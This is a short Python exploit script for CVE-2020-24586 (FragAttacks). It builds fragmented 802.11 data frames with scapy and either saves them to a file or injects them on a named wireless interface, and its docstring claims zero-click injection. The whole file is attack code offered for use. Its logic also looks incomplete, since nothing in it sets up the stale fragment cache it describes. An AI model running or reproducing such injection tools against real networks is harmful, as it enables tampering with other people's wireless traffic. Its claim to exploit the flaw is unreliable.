#!/usr/bin/env python3
"""CVE-2020-24586 — FragAttacks: fragment cache not cleared on (re)association.
Stale cached fragments from a prior connection get mixed into a new one,
so an attacker can inject/overwrite. Zero-click. Public (Vanhoef). HIGH."""
import struct, sys
from pathlib import Path

def _radiotap():
    return bytes.fromhex("00000a000000000000000000")

def build_fragment(more: bool, seq: int, payload: bytes,
                   dst="ffffffffffff", src="001122334455", bssid="66778899aabb") -> bytes:
    fc = bytes.fromhex("0801")          # data, to-DS (fragmented)
    frag = 0x04 if more else 0x00       # More Fragments bit
    seqctl = struct.pack("<H", (seq << 4) | frag)
    return (_radiotap() + fc + b"\x00\x00" + bytes.fromhex(dst) +
            bytes.fromhex(src) + bytes.fromhex(bssid) + seqctl + payload)

def build() -> bytes:
    # frag 0 declares more to come; frag 1 completes — but the cache is stale
    f0 = build_fragment(True, 0, b"\xaa\xaa\x03\x00\x00\x00\x08\x00" + b"A" * 8)
    f1 = build_fragment(False, 1, b"B" * 8)
    return f0 + f1

def inject(iface, frame=None):
    try:
        from scapy.all import sendp, Raw
        sendp(Raw(frame or build()), iface=iface, verbose=False)
        print(f"[+] CVE-2020-24586 fragments injected on {iface}"); return True
    except Exception as e:
        print(f"[-] {e}"); return False

def main():
    if len(sys.argv) > 2: inject(sys.argv[1])
    else:
        out = Path(sys.argv[1] if len(sys.argv) > 1 else "cve-2020-24586.frame")
        d = build(); out.write_bytes(d)
        print(f"[+] CVE-2020-24586 fragments -> {out} ({len(d)} bytes)")

if __name__ == "__main__":
    main()
